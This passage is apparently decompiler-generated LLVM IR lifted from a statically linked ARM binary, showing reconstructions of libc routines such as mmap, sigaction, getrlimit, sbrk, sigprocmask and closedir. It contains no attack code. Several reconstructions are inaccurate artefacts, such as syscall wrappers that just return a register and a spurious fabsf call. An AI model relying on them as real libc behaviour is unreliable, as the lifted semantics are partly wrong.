  %v3_e360 = mul i32 %v6_e35c, %v2_e358
  %v2_e364 = load i32, i32* %r2.global-to-local, align 4
  %v5_e368 = sdiv i32 %v6_e350, 8
  %v5_e36c = udiv i32 %v2_e358, 2
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v6_e368 = and i32 %v5_e36c, %v5_e368
  %v6_e36c = and i32 %v6_e368, %v2_e364
  %v4_e370 = and i32 %v6_e36c, %v3_e360
  store i32 %v4_e370, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_e348, %bb85
  %v5_e370 = phi i32 [ %v1_e34c, %dec_label_pc_e348 ], [ %v4_e370, %bb85 ]
  ret i32 %v5_e370

; uselistorder directives
  uselistorder i32 %v9_e358, { 1, 0 }
  uselistorder i32 %v1_e34c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_e300, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e2fc, { 1, 0, 2 }
  uselistorder i32 %v1_e2e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e2cc, { 1, 0 }
  uselistorder i32 %v2_e22c, { 1, 0 }
  uselistorder i32 %v2_e204.pre, { 2, 0, 1 }
  uselistorder i32 %v1_e1f8, { 1, 0 }
  uselistorder i32 %v1_e1f4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_e1e8, { 1, 0 }
  uselistorder i32 %v1_e1b4, { 1, 0 }
  uselistorder i32 %v1_e1b0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e1a4, { 1, 0 }
  uselistorder i32 %v2_e180, { 1, 0, 2 }
  uselistorder i32 %v4_e164, { 1, 0, 2 }
  uselistorder i32 %v4_e154, { 1, 0, 2, 3 }
  uselistorder i1 %v8_e09c, { 1, 2, 0 }
  uselistorder i32 %v2_e068, { 1, 2, 0 }
  uselistorder i32 %v1_e064, { 1, 2, 0 }
  uselistorder i1 %v2_e050, { 1, 0, 2 }
  uselistorder i32 %v5_e054, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e020, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e008, { 1, 0, 2 }
  uselistorder i32 %v2_dffc, { 1, 0, 2 }
  uselistorder i32 %v3_dfcc, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 5, 6, 7, 8, 9, 11, 10, 14, 15, 16, 3, 12, 13, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 2624, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_e348, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e300, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e2e8, { 1, 0 }
  uselistorder label %dec_label_pc_e250, { 1, 0 }
  uselistorder label %dec_label_pc_e228, { 1, 0 }
  uselistorder label %dec_label_pc_e1a4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0f8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_e068, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_e050, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e39c = load i32, i32* @r4, align 4
  store i32 %v3_e39c, i32* %stack_var_-16, align 4
  %v3_e3a8 = urem i32 %arg5, 4096
  %v2_e3ac = icmp eq i32 %v3_e3a8, 0
  br i1 %v2_e3ac, label %dec_label_pc_e3d0, label %dec_label_pc_e3b4

dec_label_pc_e3b4:                                ; preds = %entry
  %v0_e3b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_e3b8, i32* %r0.global-to-local, align 4
  %v3_e3bc = load i16, i16* @global_var_222f0.75, align 2
  %v4_e3bc = sext i16 %v3_e3bc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_e3c8 = add i32 %v4_e3bc, %v0_e3b8
  %v4_e3c8 = inttoptr i32 %v3_e3c8 to i32*
  store i32 22, i32* %v4_e3c8, align 4
  %v0_e404.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e404

dec_label_pc_e3d0:                                ; preds = %entry
  %v0_e3e0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e3e0, -4095
  br i1 %tmp, label %dec_label_pc_e400, label %dec_label_pc_e3e8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3d0
  %v1_e3ec = sub i32 0, %v0_e3e0
  %v3_e3f0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e3f0 = sext i16 %v3_e3f0 to i32
  %v0_e3f4 = call i32 @__aeabi_read_tp()
  %v3_e3f8 = add i32 %v4_e3f0, %v0_e3f4
  %v4_e3f8 = inttoptr i32 %v3_e3f8 to i32*
  store i32 %v1_e3ec, i32* %v4_e3f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e400

dec_label_pc_e400:                                ; preds = %dec_label_pc_e3d0, %dec_label_pc_e3e8
  %v0_e400 = phi i32 [ %v0_e3e0, %dec_label_pc_e3d0 ], [ -1, %dec_label_pc_e3e8 ]
  store i32 %v0_e400, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e3b4, %dec_label_pc_e400
  %v0_e404 = phi i32 [ %v0_e404.pre, %dec_label_pc_e3b4 ], [ %v0_e400, %dec_label_pc_e400 ]
  store i32 %v0_e404, i32* %r0.global-to-local, align 4
  %v2_e408 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e408, i32* @r4, align 4
  ret i32 %v0_e404

; uselistorder directives
  uselistorder i32 %v0_e404, { 1, 0 }
  uselistorder i32 %v0_e3e0, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_e404, { 1, 0 }
  uselistorder label %dec_label_pc_e400, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_e418 = load i32, i32* @lr, align 4
  store i32 %v0_e418, i32* %stack_var_-4, align 4
  %v0_e420 = load i32, i32* @r0, align 4
  %v3_e424 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e424 = sext i16 %v3_e424 to i32
  store i32 %v4_e424, i32* @r2, align 4
  %v0_e428 = call i32 @__aeabi_read_tp()
  %v1_e42c = sub i32 0, %v0_e420
  store i32 %v1_e42c, i32* @r3, align 4
  %v2_e430 = load i32, i32* @r2, align 4
  %v3_e430 = add i32 %v2_e430, %v0_e428
  %v4_e430 = inttoptr i32 %v3_e430 to i32*
  store i32 %v1_e42c, i32* %v4_e430, align 4
  %v2_e438 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_e438, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v6_e444 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_e44c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_e44c, label %dec_label_pc_e4a0, label %dec_label_pc_e464

dec_label_pc_e464:                                ; preds = %entry
  %v1_e464 = add i32 %arg2, 4
  %v2_e464 = inttoptr i32 %v1_e464 to i32*
  %v3_e464 = load i32, i32* %v2_e464, align 4
  store i32 %v3_e464, i32* @r3, align 4
  %v1_e468 = and i32 %v3_e464, 67108864
  %v2_e468 = icmp eq i32 %v1_e468, 0
  br i1 %v2_e468, label %dec_label_pc_e470, label %dec_label_pc_e4a0

dec_label_pc_e470:                                ; preds = %dec_label_pc_e464
  store i32 20, i32* @r2, align 4
  %v2_e474 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e474, i32* @r0, align 4
  %v0_e478 = call i32 @memcpy()
  %v0_e4a0.pre = load i32, i32* @r5, align 4
  %v0_e4a8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4a0

dec_label_pc_e4a0:                                ; preds = %dec_label_pc_e464, %entry, %dec_label_pc_e470
  %v0_e4a8 = phi i32 [ %arg3, %dec_label_pc_e464 ], [ %arg3, %entry ], [ %v0_e4a8.pre, %dec_label_pc_e470 ]
  %v0_e4a4 = phi i32 [ %arg2, %dec_label_pc_e464 ], [ 0, %entry ], [ %v2_e474, %dec_label_pc_e470 ]
  %v0_e4a0 = phi i32 [ %arg1, %dec_label_pc_e464 ], [ %arg1, %entry ], [ %v0_e4a0.pre, %dec_label_pc_e470 ]
  %v4_e4b0 = call i32 @__syscall_rt_sigaction(i32 %v0_e4a0, i32 %v0_e4a4, i32 %v0_e4a8, i32 8)
  store i32 %v6_e444, i32* @r5, align 4
  ret i32 %v4_e4b0

; uselistorder directives
  uselistorder label %dec_label_pc_e4a0, { 2, 0, 1 }
}

define i32 @function_e4c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_e4c4:
  %v0_e4c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e4c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e4c4
  %v3_e4c4 = mul i32 %arg1, %arg1
  %v2_e4c8 = load i32, i32* @r4, align 4
  %v4_e4c8 = mul i32 %v2_e4c8, 2
  %v5_e4c8 = and i32 %v4_e4c8, %v3_e4c4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e4c4, %bb
  %v6_e4c8 = phi i32 [ %arg1, %dec_label_pc_e4c4 ], [ %v5_e4c8, %bb ]
  ret i32 %v6_e4c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_e4d0 = call i32 @__sigsetjmp()
  ret i32 %v0_e4d0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e500 = load i32, i32* @r7, align 4
  store i32 %v3_e500, i32* %stack_var_-8, align 4
  %v0_e50c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e50c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e50c, -4095
  br i1 %tmp, label %dec_label_pc_e534, label %dec_label_pc_e51c

dec_label_pc_e51c:                                ; preds = %entry
  %v0_e520 = call i32 @__aeabi_read_tp()
  %v3_e524 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e524 = sext i16 %v3_e524 to i32
  %v0_e528 = load i32, i32* %r2.global-to-local, align 4
  %v1_e528 = sub i32 0, %v0_e528
  store i32 %v1_e528, i32* %r2.global-to-local, align 4
  %v3_e52c = add i32 %v4_e524, %v0_e520
  %v4_e52c = inttoptr i32 %v3_e52c to i32*
  store i32 %v1_e528, i32* %v4_e52c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e534.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %entry, %dec_label_pc_e51c
  %v1_e538 = phi i32 [ %v0_e50c, %entry ], [ -1, %dec_label_pc_e51c ]
  %v2_e534 = phi i32 [ %v3_e500, %entry ], [ %v2_e534.pre, %dec_label_pc_e51c ]
  store i32 %v2_e534, i32* @r7, align 4
  ret i32 %v1_e538

; uselistorder directives
  uselistorder i32 %v0_e50c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e534, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_e544 = ptrtoint i32* %stack_var_-16 to i32
  %v2_e550 = call i32 @getrlimit(i32 7, i32 %v2_e544)
  %v1_e554 = icmp slt i32 %v2_e550, 0
  %v5_e558 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_e554, i32 256, i32 %v5_e558
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_e57c = load i32, i32* @r0, align 4
  ret i32 %v1_e57c
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_e590 = load i32, i32* @r0, align 4
  ret i32 %v1_e590
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e5a4 = load i32, i32* @r0, align 4
  ret i32 %v1_e5a4
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_e5b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 156) to i32*), align 4
  %v1_e5b8 = inttoptr i32 %v4_e5b4 to i32*
  %v2_e5b8 = load i32, i32* %v1_e5b8, align 4
  %v2_e5bc = icmp eq i32 %v2_e5b8, 0
  br i1 %v2_e5bc, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_e5c4 = phi i32 [ %v2_e5b8, %entry ], [ 4096, %bb ]
  ret i32 %v1_e5c4

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_e5fc, label %dec_label_pc_e5e4

dec_label_pc_e5e4:                                ; preds = %entry
  %v1_e5e8 = sub i32 0, %arg1
  %v3_e5ec = load i16, i16* @global_var_222f0.75, align 2
  %v4_e5ec = sext i16 %v3_e5ec to i32
  %v0_e5f0 = call i32 @__aeabi_read_tp()
  %v3_e5f4 = add i32 %v4_e5ec, %v0_e5f0
  %v4_e5f4 = inttoptr i32 %v3_e5f4 to i32*
  store i32 %v1_e5e8, i32* %v4_e5f4, align 4
  br label %dec_label_pc_e5fc

dec_label_pc_e5fc:                                ; preds = %entry, %dec_label_pc_e5e4
  %v1_e600 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_e5e4 ]
  ret i32 %v1_e600

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e5fc, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e608 = load i32, i32* @r7, align 4
  store i32 %v3_e608, i32* %stack_var_-8, align 4
  %v0_e614 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e614, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e614, -4095
  br i1 %tmp, label %dec_label_pc_e63c, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %entry
  %v0_e628 = call i32 @__aeabi_read_tp()
  %v3_e62c = load i16, i16* @global_var_222f0.75, align 2
  %v4_e62c = sext i16 %v3_e62c to i32
  %v0_e630 = load i32, i32* %r2.global-to-local, align 4
  %v1_e630 = sub i32 0, %v0_e630
  store i32 %v1_e630, i32* %r2.global-to-local, align 4
  %v3_e634 = add i32 %v4_e62c, %v0_e628
  %v4_e634 = inttoptr i32 %v3_e634 to i32*
  store i32 %v1_e630, i32* %v4_e634, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e63c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e63c

dec_label_pc_e63c:                                ; preds = %entry, %dec_label_pc_e624
  %v1_e640 = phi i32 [ %v0_e614, %entry ], [ -1, %dec_label_pc_e624 ]
  %v2_e63c = phi i32 [ %v3_e608, %entry ], [ %v2_e63c.pre, %dec_label_pc_e624 ]
  store i32 %v2_e63c, i32* @r7, align 4
  ret i32 %v1_e640

; uselistorder directives
  uselistorder i32 %v0_e614, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e63c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_e658 = load i32, i32* @r0, align 4
  ret i32 %v1_e658
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e65c = load i32, i32* @r7, align 4
  store i32 %v3_e65c, i32* %stack_var_-8, align 4
  %v0_e668 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e668, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_e668, -4095
  br i1 %tmp, label %dec_label_pc_e690, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %entry
  %v0_e67c = call i32 @__aeabi_read_tp()
  %v3_e680 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e680 = sext i16 %v3_e680 to i32
  %v0_e684 = load i32, i32* @r2, align 4
  %v1_e684 = sub i32 0, %v0_e684
  store i32 %v1_e684, i32* @r2, align 4
  %v3_e688 = add i32 %v4_e680, %v0_e67c
  %v4_e688 = inttoptr i32 %v3_e688 to i32*
  store i32 %v1_e684, i32* %v4_e688, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e690.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %entry, %dec_label_pc_e678
  %v1_e694 = phi i32 [ %v0_e668, %entry ], [ -1, %dec_label_pc_e678 ]
  %v2_e690 = phi i32 [ %v3_e65c, %entry ], [ %v2_e690.pre, %dec_label_pc_e678 ]
  store i32 %v2_e690, i32* @r7, align 4
  ret i32 %v1_e694

; uselistorder directives
  uselistorder i32 %v0_e668, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e69c = load i32, i32* @r4, align 4
  store i32 %v3_e69c, i32* %stack_var_-16, align 4
  store i32 12192, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r4.global-to-local, align 4
  %v4_e6ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 12192) to i32*), align 4
  %v2_e6b0 = icmp eq i32 %v4_e6ac, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_e6b0, label %dec_label_pc_e6bc, label %dec_label_pc_e6cc

dec_label_pc_e6bc:                                ; preds = %entry
  %v1_e6c0 = call i32 @__GI_brk(i32 0)
  %v1_e6c4 = icmp slt i32 %v1_e6c0, 0
  br i1 %v1_e6c4, label %dec_label_pc_e6f0, label %dec_label_pc_e6ccthread-pre-split

dec_label_pc_e6ccthread-pre-split:                ; preds = %dec_label_pc_e6bc
  %v0_e6d0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_e6cc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e6cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e6ccthread-pre-split, %entry
  %v1_e6cc = phi i32 [ %v1_e6cc.pre, %dec_label_pc_e6ccthread-pre-split ], [ 12192, %entry ]
  %v0_e6cc = phi i32 [ %v0_e6cc.pre, %dec_label_pc_e6ccthread-pre-split ], [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ]
  %v1_e6e0 = phi i32 [ %v0_e6d0.pr, %dec_label_pc_e6ccthread-pre-split ], [ %arg1, %entry ]
  %v2_e6cc = add i32 %v0_e6cc, %v1_e6cc
  %v3_e6cc = inttoptr i32 %v2_e6cc to i32*
  %v4_e6cc = load i32, i32* %v3_e6cc, align 4
  %v2_e6d0 = icmp eq i32 %v1_e6e0, 0
  store i32 %v4_e6cc, i32* %r4.global-to-local, align 4
  br i1 %v2_e6d0, label %dec_label_pc_e6f4, label %dec_label_pc_e6dc

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e6cc
  %v2_e6e0 = add i32 %v4_e6cc, %v1_e6e0
  %v1_e6e4 = call i32 @__GI_brk(i32 %v2_e6e0)
  %v1_e6e8 = icmp slt i32 %v1_e6e4, 0
  br i1 %v1_e6e8, label %dec_label_pc_e6f0, label %dec_label_pc_e6dc.dec_label_pc_e6f4_crit_edge

dec_label_pc_e6dc.dec_label_pc_e6f4_crit_edge:    ; preds = %dec_label_pc_e6dc
  %v0_e6f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e6f4

dec_label_pc_e6f0:                                ; preds = %dec_label_pc_e6dc, %dec_label_pc_e6bc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e6f4

dec_label_pc_e6f4:                                ; preds = %dec_label_pc_e6cc, %dec_label_pc_e6dc.dec_label_pc_e6f4_crit_edge, %dec_label_pc_e6f0
  %v0_e6f4 = phi i32 [ %v0_e6f4.pre, %dec_label_pc_e6dc.dec_label_pc_e6f4_crit_edge ], [ -1, %dec_label_pc_e6f0 ], [ %v4_e6cc, %dec_label_pc_e6cc ]
  %v2_e6f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e6f8, i32* @r4, align 4
  ret i32 %v0_e6f4

; uselistorder directives
  uselistorder i32 %v4_e6cc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_e6f4, { 2, 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_e70c = icmp eq i32* %arg2, null
  br i1 %v2_e70c, label %dec_label_pc_e750, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %entry
  %v2_e720 = load i32, i32* %arg2, align 4
  %v1_e724 = icmp slt i32 %v2_e720, 0
  br i1 %v1_e724, label %dec_label_pc_e738, label %dec_label_pc_e72c

dec_label_pc_e72c:                                ; preds = %dec_label_pc_e720
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_e72c = load i32, i32* %.pre3, align 4
  %v1_e730 = urem i32 %v3_e72c, 2
  %v2_e730 = icmp eq i32 %v1_e730, 0
  br i1 %v2_e730, label %dec_label_pc_e750, label %dec_label_pc_e738

dec_label_pc_e738:                                ; preds = %dec_label_pc_e720, %dec_label_pc_e72c
  %v2_e738 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_e738 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_e750

dec_label_pc_e750:                                ; preds = %entry, %dec_label_pc_e72c, %dec_label_pc_e738
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_e784, label %dec_label_pc_e76c

dec_label_pc_e76c:                                ; preds = %dec_label_pc_e750
  %v1_e770 = sub i32 0, %arg1
  %v3_e774 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e774 = sext i16 %v3_e774 to i32
  %v0_e778 = call i32 @__aeabi_read_tp()
  %v3_e77c = add i32 %v4_e774, %v0_e778
  %v4_e77c = inttoptr i32 %v3_e77c to i32*
  store i32 %v1_e770, i32* %v4_e77c, align 4
  br label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %dec_label_pc_e750, %dec_label_pc_e76c
  %v1_e78c = phi i32 [ %arg1, %dec_label_pc_e750 ], [ -1, %dec_label_pc_e76c ]
  ret i32 %v1_e78c

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e784, { 1, 0 }
  uselistorder label %dec_label_pc_e750, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e738, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e7a4 = load i32, i32* @r0, align 4
  ret i32 %v1_e7a4
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_e7d4, label %dec_label_pc_e7bc

dec_label_pc_e7bc:                                ; preds = %entry
  %v1_e7c0 = sub i32 0, %arg1
  %v3_e7c4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e7c4 = sext i16 %v3_e7c4 to i32
  %v0_e7c8 = call i32 @__aeabi_read_tp()
  %v3_e7cc = add i32 %v4_e7c4, %v0_e7c8
  %v4_e7cc = inttoptr i32 %v3_e7cc to i32*
  store i32 %v1_e7c0, i32* %v4_e7cc, align 4
  br label %dec_label_pc_e7d4

dec_label_pc_e7d4:                                ; preds = %entry, %dec_label_pc_e7bc
  %v1_e7d8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_e7bc ]
  ret i32 %v1_e7d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e7d4, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_e7e4 = load i32, i32* %arg1, align 4
  store i32 %v2_e7e4, i32* %r3.global-to-local, align 4
  %v3_e7ec = icmp eq i32 %v2_e7e4, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  br i1 %v3_e7ec, label %dec_label_pc_e800, label %dec_label_pc_e81c

dec_label_pc_e800:                                ; preds = %entry
  store i32 80608, i32* %r2.global-to-local, align 4
  %v0_e804 = call i32 @__aeabi_read_tp()
  %v3_e808 = load i16, i16* @global_var_222f0.75, align 2
  %v4_e808 = sext i16 %v3_e808 to i32
  store i32 %v4_e808, i32* %r2.global-to-local, align 4
  %v0_e80c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e80c, i32* %r1.global-to-local, align 4
  %v1_e810 = add i32 %v0_e80c, 10
